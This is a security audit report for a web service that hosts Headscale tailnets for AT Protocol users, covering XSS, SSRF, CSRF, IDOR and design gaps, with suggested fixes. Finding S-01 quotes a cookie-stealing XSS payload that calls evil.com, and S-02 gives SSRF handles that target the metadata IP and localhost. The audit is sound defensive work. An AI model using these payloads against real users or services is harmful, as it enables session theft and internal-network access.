# Codebase Audit — atproto-tailnet

**Date:** 2026-10-23
**Scope:** Every file in `src/`, all ADRs (0001–0004), BUILD_PLAN.md, CLAUDE.md, docker-compose.yml, Caddyfile, drizzle config/migrations, `.env`/`.env.example`

---

## 1. Security Findings

### S-01: Stored XSS from User-Controlled Data in Dashboard HTML

**Severity:** CRITICAL
**File:** `src/routes/dashboard.ts`, lines 314–483
**Description:** The inline SPA puts user-controlled data into HTML with string concatenation and does not escape it. This data includes handles, display names, tenant names, avatar URLs, device names, IP addresses, and auth key commands. An attacker can set their Bluesky display name to `<img src=x onerror="fetch('https://evil.com/'+document.cookie)">`. The attacker can then execute arbitrary JavaScript in every dashboard that shows their name (e.g., member lists, invitation lists).

Affected render paths:
- `renderDevices()` — `d.name`, `d.user`, `d.ipAddresses` (lines 317–321)
- `renderMembers()` — `m.avatarUrl`, `m.displayName`, `m.handle` (lines 331–335)
- `renderInvitationsReceived()` — `inv.tenantName`, `inv.inviterDisplayName`, `inv.inviterHandle` (lines 349–351)
- `renderDashboard()` — `state.user.avatarUrl`, `state.user.handle` (lines 367–368)
- `renderTenantView()` — `t.name` (lines 381, 396)
- `generateAuthKey()` — `result.command` (line 483)

**Suggested fix:** Add an HTML escape function. Use it on every interpolated value:
```javascript
function esc(s) {
  const d = document.createElement('div');
  d.textContent = s;
  return d.innerHTML;
}
```
Apply `esc()` to every user-controlled string before concatenation. For `img src` attributes, also verify that the URL starts with `https://`.

---

### S-02: SSRF through Handle Resolution

**Severity:** HIGH
**File:** `src/routes/invitations.ts`, lines 23–31
**Description:** The `resolveHandleToDid()` function takes a handle from the user and sends an HTTP request to `https://${cleanHandle}/.well-known/atproto-did`. The only sanitization removes a leading `@`. An attacker can supply a handle like `169.254.169.254/latest/meta-data#` or `internal-service.local:8080/path#`. The server then fetches arbitrary URLs (the `#` changes the `.well-known/atproto-did` suffix into a fragment).

A handle like `localhost:3000` makes the server send requests to itself. These requests can reach internal endpoints.

**Suggested fix:** Verify that the handle matches the AT Protocol handle format before the server sends any request:
```typescript
const HANDLE_RE = /^([a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}$/;
if (!HANDLE_RE.test(cleanHandle)) {
  return null; // or throw
}
```
Also consider the `@atproto/api` handle resolution functions. They include correct validation.

---

### S-03: Headscale Ports Bound to All Interfaces (0.0.0.0)

**Severity:** HIGH
**File:** `src/orchestrator/headscale.ts`, lines 124–126
**Description:** The Docker port bindings do not specify a `HostIp`. Headscale instances are therefore reachable on all network interfaces. This has these results:
1. The network can reach the Headscale REST API directly. Caddy is bypassed.
2. The Tailscale control protocol is exposed externally on raw ports (10001–10100).
3. An attacker with network access can probe and attack Headscale instances directly.

The docker-compose.yml correctly binds Caddy and PostgreSQL to `127.0.0.1`. The containers that the app creates do not have this binding.

**Suggested fix:** Add `HostIp: "127.0.0.1"` to the port binding:
```typescript
PortBindings: {
  "8080/tcp": [{ HostIp: "127.0.0.1", HostPort: String(port) }],
},
```

---

### S-04: No CSRF Protection

**Severity:** HIGH
**File:** `src/index.ts` (entire app)
**Description:** The application has no CSRF mitigation. The state-changing endpoints accept requests without a CSRF token. These endpoints include `POST /auth/logout`, `POST /api/tenants/:id/invitations`, `POST /api/invitations/:id/accept`, and the `DELETE` routes. The JSON `Content-Type` requirement gives partial mitigation, because browsers do not send JSON from form submissions. But a malicious page can bypass it with `fetch()` if the cookie has no `SameSite` attribute.

**Suggested fix:**
1. Add `sameSite: 'lax'` to the cookie configuration (immediate fix).
2. For Phase 4 production, add a CSRF token library (e.g., `csrf-csrf` or the successor of `csurf`).

---

### S-05: Missing `sameSite` Cookie Attribute

**Severity:** HIGH
**File:** `src/index.ts`, lines 19–22
**Description:** The session cookie configuration sets `httpOnly` and, in some cases, `secure`. It does not set `sameSite`. Without this attribute, the browser can send the cookie on cross-origin requests. This enables CSRF attacks against all state-changing endpoints.

**Suggested fix:**
```typescript
cookie: {
  secure: config.publicUrl.startsWith("https"),
  httpOnly: true,
  sameSite: "lax",
  maxAge: 7 * 24 * 60 * 60 * 1000,
},
```

---

### S-06: Session Secret Has No Minimum Strength Validation

**Severity:** MEDIUM
**File:** `src/config.ts`, line 11
**Description:** The `sessionSecret` config field has the default `"dev-secret-change-me"`. It has no validation for minimum length or entropy. In production, an operator can forget to change it or can set a weak value. Then anyone who guesses the secret can forge session cookies.

**Suggested fix:** Add a Zod refinement for non-localhost deployments:
```typescript
sessionSecret: z.string().min(32, "Session secret must be at least 32 characters"),
```
Or verify at startup that the secret is not one of the known defaults.

---

### S-07: IDOR on Tenant Invitations Endpoint

**Severity:** MEDIUM
**File:** `src/routes/api.ts`, lines 69–76
**Description:** `GET /api/tenants/:id/invitations` requires authentication. It does NOT verify that the requesting user is a member of the specified tenant. Any authenticated user who knows (or guesses) a tenant UUID can see all invitations for that tenant. This includes the handles and DIDs of the invitees.

**Suggested fix:** Add a membership check before the endpoint returns data:
```typescript
const [membership] = await db
  .select()
  .from(memberships)
  .where(and(eq(memberships.tenantId, tenantId), eq(memberships.userId, req.session.userId!)));
if (!membership) {
  res.status(404).json({ error: "Tenant not found" });
  return;
}
```

---

### S-08: No Rate Limiting on Any Endpoint

**Severity:** MEDIUM
**File:** `src/index.ts` (entire app)
**Description:** No endpoint has rate limiting. This enables these attacks:
- Brute-force handle enumeration through `/auth/login`
- Invitation spam through `POST /api/tenants/:id/invitations`
- Resource exhaustion through fast tenant provisioning (each tenant creates a Docker container)
- Handle resolution abuse (each invitation causes external HTTP requests)

BUILD_PLAN.md lists this as Phase 4 work (line 125: "Rate limiting, CSRF protection").

**Suggested fix:** Add `express-rate-limit` with sensible defaults for auth endpoints (e.g., 10 attempts/minute) and API endpoints (e.g., 60 requests/minute).

---

### S-09: Race Condition in Port Allocation

**Severity:** MEDIUM
**File:** `src/orchestrator/ports.ts` + `src/routes/auth.ts`, lines 25–37
**Description:** `allocatePort()` reads all used ports from the DB. Then the caller inserts a tenant with that port. These operations are not in a transaction. When two registrations run at the same time, both requests can read the same port as available. Both requests then try to INSERT. The `UNIQUE` constraint on `tenants.port` makes the second request fail with an unhandled DB error (500 to the user).

**Suggested fix:** Put the port allocation and the tenant insert in a serializable transaction. Or use `SELECT ... FOR UPDATE` or advisory locks. At minimum, catch the unique constraint violation and retry.

---

### S-10: Async Provisioning Error Not Propagated

**Severity:** MEDIUM
**File:** `src/routes/auth.ts`, lines 46–83
**Description:** The `setImmediate()` async callback catches errors and sets the tenant status to "error". But nothing tells the user what went wrong. The dashboard shows the generic message "Something went wrong". If Docker is not available or the Headscale image is not pulled, the user is stuck with an "error" tenant. The user cannot retry and cannot understand the issue.

Also, the async callback returns a promise that no code awaits. In strict environments, an unhandled promise rejection inside `setImmediate` can crash the process.

**Suggested fix:** Put the body of the setImmediate callback in a try/catch that logs the full error. Consider a job queue (e.g., `p-queue`) instead of `setImmediate`. A job queue gives better error handling and retry.

---

### S-11: Member Removal Does Not Clean Up Headscale

**Severity:** MEDIUM
**File:** `src/routes/devices.ts`, lines 183–212
**Description:** `DELETE /api/tenants/:tenantId/members/:userId` deletes the membership record from PostgreSQL. It does NOT remove the user or the devices of the user from the Headscale instance. The devices of the removed member stay connected to the tailnet and can continue to communicate.

**Suggested fix:** After the membership delete, use the HeadscaleApiClient to do these steps:
1. List and delete all nodes that belong to the Headscale username of the removed user.
2. Optionally, delete the Headscale user.

---

### S-12: Internal Port Leaked in API Responses

**Severity:** LOW
**File:** `src/routes/api.ts`, lines 32–43 and 59–67
**Description:** The responses of `GET /api/tenants` and `GET /api/tenants/:id` include the `port` field. This is an internal infrastructure detail (the host port where the Headscale Docker container is bound). This information helps an attacker target Headscale instances directly. The risk is higher with S-03, where the ports are bound to all interfaces.

**Suggested fix:** Remove `port` from the API response. The `loginServer` URL for clients must use the Caddy subdomain and not `localhost:PORT`.

---

### S-13: Login Server URL Uses localhost Instead of Caddy Subdomain

**Severity:** LOW
**File:** `src/routes/api.ts`, line 66; `src/routes/devices.ts`, line 105
**Description:** The `loginServer` URL that the app returns to clients is `http://localhost:${port}`. This works only in local development. In production, the URL must be `https://${slug}.${baseDomain}`. Then Tailscale clients connect through the Caddy reverse proxy.

**Suggested fix:** Generate the login server URL from the tenant slug and the base domain:
```typescript
const loginServer = `${config.publicUrl.startsWith('https') ? 'https' : 'http'}://${tenant.slug}.${config.baseDomain}`;
```

---

## 2. ADR Compliance Findings

### A-01: ADR-0002 — Tenant Deletion Cleanup Not Implemented

**Severity:** HIGH
**File:** `src/orchestrator/headscale.ts` (destroyInstance, line 156); no route calls it
**Description:** ADR-0004 specifies the `delete_tenant` flow:
1. Stop and remove the Docker container
2. Remove the Caddy upstream
3. Optionally archive the data volume
4. Mark the tenant as deleted in PostgreSQL

The code implements only step 1 (`destroyInstance`), and no route calls it. Steps 2–4 do not exist. There is no tenant deletion endpoint. `removeTenantRoute()` exists in `caddy.ts`, but no code calls it. No code cleans up the data directory on the host filesystem.

**Suggested fix:** Implement a `DELETE /api/tenants/:id` route that does these steps:
1. Call `destroyInstance(containerId)`
2. Call `removeTenantRoute(slug)`
3. Optionally archive or remove `${dataDir}/${slug}`
4. Set the tenant status to "deleted" in PostgreSQL

---

### A-02: ADR-0003 — DNS TXT Resolution Not Implemented

**Severity:** MEDIUM
**File:** `src/routes/invitations.ts`, lines 21–48
**Description:** ADR-0003 states that handle resolution works through "DNS TXT or HTTP." The code has a comment "Try DNS TXT _atproto.<handle>" (line 21). But the implementation uses only these two methods:
1. HTTP `/.well-known/atproto-did` (line 23–30)
2. Bluesky public API fallback (line 33–47)

The code does not implement DNS TXT resolution. The code cannot resolve self-hosted PDS users who use DNS TXT records for handle verification (without HTTP).

**Suggested fix:** Add DNS TXT resolution with Node's `dns.resolveTxt()`:
```typescript
import { resolveTxt } from 'node:dns/promises';
const records = await resolveTxt(`_atproto.${cleanHandle}`);
const didRecord = records.flat().find(r => r.startsWith('did='));
```

---

### A-03: ADR-0004 — gRPC/REST API vs CLI Exec Inconsistency

**Severity:** MEDIUM
**File:** `src/orchestrator/headscale.ts` (CLI exec), `src/orchestrator/headscale-api.ts` (REST client)
**Description:** ADR-0004 says the service communicates with Headscale through the "gRPC API (and REST through grpc-gateway)" with an "instance-specific API key." In practice, the codebase uses two different methods:

- **CLI exec (through `docker exec`):** Creates API keys (line 133), creates users (line 146, 192), and creates pre-auth keys (line 201)
- **REST API (through `HeadscaleApiClient`):** Lists nodes, deletes nodes, renames nodes, sets policy, and runs the health check

Some operations use the REST API, which needs the API key. Other operations bypass it and use CLI exec, which has full admin access inside the container. The REST client has methods for `createUser` and `createPreAuthKey`. No code uses them. The code uses the CLI exec versions.

**Suggested fix:** Use the REST API client for all operations. The CLI exec creation of the API key is necessary for bootstrap. After that step, all operations must use `HeadscaleApiClient`. Remove or deprecate the CLI exec helper functions for the creation of users and keys.

---

### A-04: ADR-0001 — Headscale Image Version Is Correctly Pinned

**Severity:** N/A (PASS)
**File:** `.env`, line 12; `src/config.ts`, line 14
**Description:** ADR-0001 references Headscale v0.29.1. The config default is `headscale/headscale:0.29.1`, and the `.env` file has the same value. The image tag is pinned. It is not a floating tag (e.g., not `:latest`).

---

### A-05: ADR-0003 — BFF Pattern Correctly Implemented

**Severity:** N/A (PASS)
**File:** `src/auth/atproto.ts`, `src/routes/auth.ts`
**Description:** ADR-0003 requires the BFF pattern: the server keeps all tokens, and the browser receives HTTP-only cookies. The implementation correctly keeps OAuth sessions in the in-memory session store (server-side). The browser receives only an `express-session` cookie with `httpOnly: true`. The server never sends AT Proto tokens to the client.

---

### A-06: ADR-0004 — Architecture Matches Diagram

**Severity:** N/A (PASS with caveats)
**File:** All source files
**Description:** The architecture matches the ADR-0004 diagram: Express service on :3000, PostgreSQL for service state, Docker containers for Headscale instances, and Caddy for the reverse proxy. The caveats are the incomplete Caddy integration (A-01) and the dual API path (A-03).

---

## 3. Composability/Consistency Findings

### C-01: `ensureCaddyBaseConfig()` Is Dead Code

**Severity:** MEDIUM
**File:** `src/orchestrator/caddy.ts`, lines 39–64
**Description:** `ensureCaddyBaseConfig()` is defined, but no code imports or calls it. The initial Caddy configuration comes from the `Caddyfile` that docker-compose.yml mounts. Assume you deploy the application without the Caddyfile, or with a different reverse proxy setup. Then the Caddy admin API routes have no base server config, and `addTenantRoute()` fails.

**Suggested fix:** Do one of these:
1. Call `ensureCaddyBaseConfig()` at startup in `src/index.ts` (instead of the Caddyfile-based approach), or
2. Remove it and document that the Caddyfile is the source of truth for the base config.

---

### C-02: `removeTenantRoute()` and `destroyInstance()` Are Dead Code

**Severity:** MEDIUM
**File:** `src/orchestrator/caddy.ts` line 91; `src/orchestrator/headscale.ts` line 156
**Description:** The code defines and exports both functions, but no route handler imports or calls them. This has these results:
- Caddy routes accumulate forever. Nothing cleans them up.
- Nothing destroys Docker containers (they restart because of the `unless-stopped` policy).

This problem is directly related to A-01 (no tenant deletion flow).

**Suggested fix:** Implement the tenant deletion route that calls both functions.

---

### C-03: `CADDY_ADMIN_URL` Bypasses Config Validation

**Severity:** LOW
**File:** `src/orchestrator/caddy.ts`, lines 3–4
**Description:** The code reads the `CADDY_ADMIN_URL` environment variable directly from `process.env`. It does not use the Zod-validated config in `src/config.ts`. All other environment variables use the config schema. This inconsistency has these results:
- The Caddy URL has no type validation
- It does not appear in config type definitions
- A missing value silently falls back to `http://localhost:2019`

**Suggested fix:** Add `caddyAdminUrl` to the config schema:
```typescript
caddyAdminUrl: z.string().url().default("http://localhost:2019"),
```

---

### C-04: Duplicate Tenant Lookup Logic

**Severity:** LOW
**File:** `src/routes/devices.ts` (getTenantForUser, line 11); `src/routes/api.ts` (inline, line 47–53)
**Description:** `devices.ts` has a well-factored `getTenantForUser()` helper that checks membership. `api.ts` has a similar inline query in `GET /api/tenants/:id`. It does the same thing in a different way, and it has the IDOR bug from S-07. `invitations.ts` also has its own inline membership checks.

**Suggested fix:** Move `getTenantForUser()` to `routes/helpers.ts`. Reuse it in all route files.

---

### C-05: Inconsistent Error Handling Patterns

**Severity:** LOW
**File:** Route files
**Description:** Error handling is not consistent across routes:
- `devices.ts` wraps Headscale API calls in try/catch and returns 502 (good)
- `api.ts` does not catch Headscale API errors
- The catch blocks of `resolveHandleToDid` in `invitations.ts` silently swallow errors
- `auth.ts` logs errors but returns a generic 500
- `caddy.ts` catches and logs errors but does not propagate them (silent failures)

**Suggested fix:** Use one consistent error handling pattern:
1. Wrap all external service calls (Headscale, Caddy, AT Proto) in try/catch
2. Return the correct HTTP status codes (502 for upstream failures, 500 for internal failures)
3. Log the full error on the server. Return a sanitized message to the client

---

### C-06: Dashboard JS Does Not Handle All Error Cases

**Severity:** LOW
**File:** `src/routes/dashboard.ts`, lines 250–263
**Description:** The `api()` helper function in the dashboard JS does these things:
- It handles 401 and renders the login page again (good)
- It handles non-OK responses and shows a toast (good)
- It does NOT handle network errors (fetch rejection). If the server is down, the promise rejects and the error goes to the console. The user receives no feedback
- It does not handle JSON parse failures

**Suggested fix:** Wrap the `api()` function in a try/catch:
```javascript
async function api(path, opts) {
  try {
    const res = await fetch(path, { ... });
    // existing logic
  } catch (e) {
    toast('Network error — check your connection');
    return null;
  }
}
```

---

### C-07: Slug Generation Can Collide

**Severity:** LOW
**File:** `src/routes/auth.ts`, lines 19–22
**Description:** The code generates tenant slugs when it replaces non-alphanumeric characters with hyphens. The handles `alice.bsky.social` and `alice-bsky-social` produce the same slug `alice-bsky-social`. The DB unique constraint catches this. But the user sees an unhandled 500 and not a meaningful message.

**Suggested fix:** Catch unique constraint errors on the slug. Add a numeric suffix (e.g., `alice-bsky-social-2`).

---

### C-08: HeadscaleApiClient Has Unused Methods

**Severity:** LOW
**File:** `src/orchestrator/headscale-api.ts`
**Description:** The REST API client defines these methods, but no code calls them:
- `createUser()` — the code uses CLI exec
- `createPreAuthKey()` — the code uses CLI exec
- `listUsers()` — no code calls it
- `deleteUser()` — no code calls it
- `getNode()` — no code calls it
- `renameNode()` — no code calls it
- `healthcheck()` — no code calls it

These methods are useful API surface. But two code paths for one operation (REST and CLI) cause confusion about which path to use.

**Suggested fix:** Change the callers to use the REST API methods after the initial bootstrap. Remove the CLI exec alternatives.

---

### C-09: `db/index.ts` Reads DATABASE_URL Directly

**Severity:** LOW
**File:** `src/db/index.ts`, lines 5–8
**Description:** The database connection reads `DATABASE_URL` directly from `process.env` with a fallback. This duplicates the logic in `config.ts`. If the `DATABASE_URL` in the config is different from the `DATABASE_URL` in the environment, the two values can diverge.

**Suggested fix:** Import `config` and use `config.databaseUrl`:
```typescript
import { config } from "../config.js";
const pool = new pg.Pool({ connectionString: config.databaseUrl });
```

---

## 4. Completeness Findings

### P-01: No Tenant Deletion API

**Severity:** HIGH
**File:** No file (missing)
**Description:** BUILD_PLAN.md Phase 2 and ADR-0004 describe a `delete_tenant` flow. No route implements it. The functions `destroyInstance()` and `removeTenantRoute()` exist, but no code connects them to a route.

**Suggested fix:** Add `DELETE /api/tenants/:id` and restrict it to owners.

---

### P-02: No Tenant Start/Stop/Restart API

**Severity:** MEDIUM
**File:** `src/orchestrator/headscale.ts` (startInstance/stopInstance defined, never called)
**Description:** The code exports `startInstance()` and `stopInstance()`, but no route calls them. BUILD_PLAN Phase 4.2 lists "Graceful shutdown/restart". No route triggers these operations.

**Suggested fix:** Add the routes `POST /api/tenants/:id/start` and `POST /api/tenants/:id/stop`.

---

### P-03: Auth State/Session Stores Are In-Memory Only

**Severity:** MEDIUM
**File:** `src/auth/atproto.ts`, lines 18–31; CLAUDE.md line 29
**Description:** The OAuth state store and the session store both use in-memory `Map` objects. This has these results:
- A server restart loses all OAuth sessions (users must authenticate again)
- The service cannot scale to more than one server instance
- Memory grows without limit (stale entries have no TTL or cleanup)

CLAUDE.md acknowledges this ("swap to DB-backed for production"). BUILD_PLAN lists "Production deployment" as Phase 4.

**Suggested fix:** For an immediate improvement, add a periodic cleanup of expired entries. For production, implement DB-backed stores with the existing PostgreSQL connection.

---

### P-04: No `.well-known` Endpoints for Production OAuth

**Severity:** LOW
**File:** No file (missing)
**Description:** ADR-0003 requires the production deployment to host these endpoints:
- `/.well-known/atproto-client-metadata.json`
- `/.well-known/jwks.json` (JWKS endpoint)

The code implements neither endpoint. The production code path in `atproto.ts` references these URLs (lines 70, 79), but no route serves them. The Caddy reverse proxy must also route them.

BUILD_PLAN Phase 4.3 lists these as TODO.

**Suggested fix:** Add Express routes that serve these endpoints. Or serve them as static files through Caddy.

---

### P-05: No Health Check Endpoint

**Severity:** LOW
**File:** No file (missing)
**Description:** The service has no `/health` or `/readiness` endpoint. A production deployment behind a load balancer or in Kubernetes needs one.

**Suggested fix:** Add a simple `GET /health` route that checks the DB connection.

---

## 5. Summary

| Severity | Count | IDs |
|----------|-------|-----|
| CRITICAL | 1 | S-01 |
| HIGH | 5 | S-02, S-03, S-04, S-05, A-01 |
| MEDIUM | 9 | S-06, S-07, S-08, S-09, S-10, S-11, A-02, A-03, C-01 |
| LOW | 10 | S-12, S-13, C-02, C-03, C-04, C-05, C-06, C-07, C-08, C-09 |
| Completeness | 5 | P-01, P-02, P-03, P-04, P-05 |
| Pass | 3 | A-04, A-05, A-06 |

### Fix Status (2026-10-23)

**The team fixed all 30 findings.**

S-01, S-02, S-03, S-04, S-05, S-06, S-07, S-08, S-09, S-10, S-11, S-12, S-13,
A-01, A-02, A-03, C-01, C-02, C-03, C-04, C-05, C-06, C-07, C-08, C-09,
P-01, P-02, P-03, P-04, P-05

The team resolved these Phase 4 items:
- S-08: Rate limiting with `express-rate-limit` — auth 10/min, API 60/min
- S-09: Port race condition — a retry loop catches PostgreSQL 23505 (unique violation) and allocates the port again, up to 3 times
- P-03: PostgreSQL backs the OAuth state/session stores (`oauth_states`, `oauth_sessions` tables). `connect-pg-simple` backs express-session
- P-04: authRouter serves `GET /.well-known/atproto-client-metadata.json` and `GET /.well-known/jwks.json`
